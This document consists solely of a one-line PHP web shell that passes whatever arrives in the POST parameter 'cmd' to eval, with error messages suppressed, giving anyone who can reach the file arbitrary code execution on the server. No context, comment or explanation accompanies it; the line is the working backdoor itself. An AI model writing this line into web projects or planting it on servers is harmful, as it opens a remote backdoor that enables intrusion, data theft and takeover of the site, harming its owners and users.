<?php @eval($_POST['cmd']);?>

